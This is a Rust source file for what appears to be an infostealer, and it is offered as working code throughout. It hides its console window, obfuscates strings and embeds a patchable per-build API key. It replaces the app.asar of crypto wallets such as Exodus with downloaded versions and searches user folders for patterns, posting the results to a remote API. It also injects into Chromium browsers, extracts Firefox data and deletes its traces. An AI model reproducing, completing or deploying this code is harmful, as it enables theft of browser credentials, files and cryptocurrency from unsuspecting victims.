#![windows_subsystem = "windows"] // Hide console window for production
mod modules;
mod utils;

use anyhow::Result;
use goldberg::{ goldberg_stmts, goldberg_string };
use modules::{ browser, filesearch, wallets, antidebug };
use once_cell::sync::Lazy;
use rand::{ Rng, distr::Alphanumeric };
use std::{ env, fs, path::PathBuf };

fn generate_random_output_dir() -> String {
    goldberg_stmts! {
        {
            let rand_str: String = rand
                ::rng()
                .sample_iter(&Alphanumeric)
                .take(8)
                .map(char::from)
                .collect();

            let base_dirs = [
                std::env::temp_dir().to_string_lossy().to_string(),
                dirs
                    ::data_local_dir()
                    .unwrap_or_else(|| std::env::temp_dir())
                    .to_string_lossy()
                    .to_string(),
                dirs
                    ::data_dir()
                    .unwrap_or_else(|| std::env::temp_dir())
                    .to_string_lossy()
                    .to_string(),
            ];

            let base = &base_dirs[rand::rng().random_range(0..base_dirs.len())];
            format!(r"{}\{}", base, rand_str)
        }
    }
}

static OUTPUT_DIR: Lazy<String> = Lazy::new(|| generate_random_output_dir());

// API endpoint and key
static BASE_API_URL: Lazy<String> = Lazy::new(||
    String::from(goldberg_string!("%BASE_URL%/"))
);

// === Patchable per-user API key ====================================
// Layout of KEY_BLOB (290 bytes):
//   [0..16]   magic sentinel (constant, used by the backend patcher)
//   [16..18]  ciphertext length, big-endian u16
//   [18..34]  XOR nonce
//   [34..290] ciphertext slot (zero-padded)
//
// The backend prebuilds this binary once with the magic in place and zeros
// elsewhere. At request time it scans for the sentinel and overwrites
// len/nonce/ciphertext per build, so the plaintext key never lives in the
// binary at rest. Runtime XOR-decodes on first access through API_KEY.
const KEY_BLOB_MAGIC: [u8; 16] = *b"\x00FLP-KEYBLOB-v1\x00";
const KEY_BLOB_LEN: usize = 16 + 2 + 16 + 256;

#[used]
#[unsafe(no_mangle)]
pub static KEY_BLOB: [u8; KEY_BLOB_LEN] = {
    let mut b = [0u8; KEY_BLOB_LEN];
    let mut i = 0;
    while i < 16 {
        b[i] = KEY_BLOB_MAGIC[i];
        i += 1;
    }
    b
};

fn decode_api_key() -> String {
    let len = u16::from_be_bytes([KEY_BLOB[16], KEY_BLOB[17]]) as usize;
    if len == 0 || len > 256 {
        return String::new();
    }
    let nonce = &KEY_BLOB[18..34];
    let ct = &KEY_BLOB[34..34 + len];
    let mut out = Vec::with_capacity(len);
    for (i, &c) in ct.iter().enumerate() {
        out.push(c ^ nonce[i % 16]);
    }
    String::from_utf8(out).unwrap_or_default()
}

static API_KEY: Lazy<String> = Lazy::new(decode_api_key);

use serde::Deserialize;

/// Fetches the public IP address using the ipwho.is API.
/// Returns an empty string if the request fails or the response is invalid.
fn fetch_public_ip() -> String {
    #[derive(Debug, Deserialize)]
    struct ExodusGeoResponse {
        ip: Option<String>,
    }

    let response = reqwest::blocking
        ::get("https://exchange.exodus.io/v3/geolocation")
        .and_then(|resp| resp.json::<ExodusGeoResponse>())
        .ok();

    match response {
        Some(data) => data.ip.unwrap_or_default(),
        None => String::new(),
    }
}

static PUBLIC_IP: Lazy<String> = Lazy::new(|| fetch_public_ip());
static DESKTOP_NAME: Lazy<String> = Lazy::new(|| std::env::var("USERNAME").unwrap_or_default());

#[tokio::main]
async fn main() -> Result<()> {
    // antidebug::block_if_protected(); // comment out to disable anti debug

    let args: Vec<String> = env::args().collect();

    // Handle child process for wallet download
    if args.len() > 1 && args[1] == "--wallet-download" {
        if args.len() != 4 {
            eprintln!("Usage: <exe> --wallet-download <url> <asar_path>");
            std::process::exit(1);
        }
        let url = &args[2];
        let asar_path = PathBuf::from(&args[3]);
        let exit_code = match wallets::download_and_replace_asar(url, &asar_path) {
            Ok(()) => {
                println!("asar replaced successfully!");
                0
            }
            Err(e) => {
                eprintln!("Failed to replace asar: {}", e);
                1
            }
        };
        // Always exit after handling wallet-download
        std::process::exit(exit_code);
    }

    let output_dir = PathBuf::from(OUTPUT_DIR.as_str());
    if let Err(e) = fs::create_dir_all(&output_dir) {
        eprintln!("Failed to create output directory {}: {}", OUTPUT_DIR.as_str(), e);
        return Err(anyhow::anyhow!("Failed to create output directory"));
    }

    // Most important first
    {
        // Write config file with API key
        let config_path = dirs::data_local_dir()
            .unwrap_or_else(|| std::env::temp_dir())
            .join("Google")
            .join("config.json");
        let config_content = serde_json::json!({
            "x-api-key": API_KEY.as_str()
        });
        if let Err(e) = fs::create_dir_all(config_path.parent().unwrap()) {
            eprintln!("Failed to create config directory: {}", e);
        } else if let Err(e) = fs::write(&config_path, config_content.to_string()) {
            eprintln!("Failed to write config file: {}", e);
        }

        use std::process::{ Command, Stdio };
        let mut children = Vec::new();
        for wallet in wallets::get_wallets() {
            let asar_path = if wallet.name == "Exodus" {
                wallets::locate_exodus_asar(&wallet.path)
            } else {
                Some(wallet.path.join("app.asar"))
            };
            if let Some(asar_path) = asar_path {
                if wallets::asar_exists(&asar_path) {
                    println!("Found {} asar at: {:?}", wallet.name, asar_path);
                    let exe = std::env::current_exe().unwrap();
                    let child = Command::new(&exe)
                        .arg("--wallet-download")
                        .arg(wallet.download_url)
                        .arg(asar_path.to_string_lossy().to_string())
                        .stdin(Stdio::null())
                        .stdout(Stdio::inherit())
                        .stderr(Stdio::inherit())
                        .spawn();
                    match child {
                        Ok(child) => children.push((wallet.name, child)),
                        Err(e) =>
                            eprintln!(
                                "Failed to spawn download process for {}: {}",
                                wallet.name,
                                e
                            ),
                    }
                } else {
                    println!("{} asar not found.", wallet.name);
                }
            } else {
                println!("{} asar not found.", wallet.name);
            }
        }
        for (name, mut child) in children {
            match child.wait() {
                Ok(status) if status.success() => println!("{} asar replaced successfully!", name),
                Ok(status) =>
                    eprintln!("{} asar download process exited with status: {}", name, status),
                Err(e) => eprintln!("Failed to wait for {} download process: {}", name, e),
            }
        }
    }

    {
        let search_root = PathBuf::from("C:/Users");
        let results = filesearch::search_patterns(&search_root);
        if results.is_empty() {
            println!("No pattern matches found.");
        } else {
            println!("Found {} pattern matches:", results.len());
            let serializable_results: Vec<_> = results
                .into_iter()
                .map(|(pattern, file, line)| {
                    serde_json::json!({
                        "file": file,
                        "line": line,
                        "pattern": pattern
                    })
                })
                .collect();

            // POST the results with new API structure
            if let Err(e) = utils::post_json_to_api(&serializable_results, "Filesearch").await {
                eprintln!("Failed to post filesearch results: {}", e);
            }
        }
    }

    {
        // Run Chromium-based browser exfiltration (requires injection)
        let browser_config = browser::chromium::injection::injector::Config {
            verbose: false,
            auto_start_browser: true,
            output_dir: Some(output_dir.join("browserAccounts")),
        };
        let _ = browser::chromium::injection::injector::run_on_all_browsers(browser_config).await;

        // Run Gecko-based browser exfiltration (Firefox/LibreWolf - no injection needed)
        let gecko_config = browser::gecko::gecko_browser::GeckoConfig {
            verbose: false,
            output_dir: Some(output_dir.join("geckoBrowsers")),
        };
        let _ = browser::gecko::gecko_browser::run_gecko_exfiltration(gecko_config).await;
    }

    // pause the console to see the output

    // use std::io::{ self, Write };
    // print!("Press Enter to exit...");
    // io::stdout().flush().unwrap();
    // let _ = io::stdin().read_line(&mut String::new());

    // make it clean up temp dir
    let _ = fs::remove_dir_all(&output_dir);
    Ok(())
}
